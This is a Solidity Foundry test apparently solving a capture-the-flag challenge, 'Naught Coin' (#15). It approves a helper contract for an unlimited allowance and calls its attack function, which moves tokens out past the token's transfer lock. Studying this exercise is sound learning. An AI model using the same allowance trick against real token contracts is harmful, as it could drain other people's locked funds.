// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import {NaughtCoin, Holder} from "../Naught.sol";

contract ContractTest is Test {
    NaughtCoin n;
    Holder holder;

    function setUp() external {
        n = new NaughtCoin(address(this));
        holder = new Holder();
    }

    function test_challenge_15() public {
        console.log("Challenge #15");
        console.log("BalanceOf address(holder)", n.balanceOf(address(holder)));
        n.approve(address(holder), type(uint256).max);
        holder.attack(address(n), address(holder));
        console.log("BalanceOf address(holder)", n.balanceOf(address(holder)));
    }
}
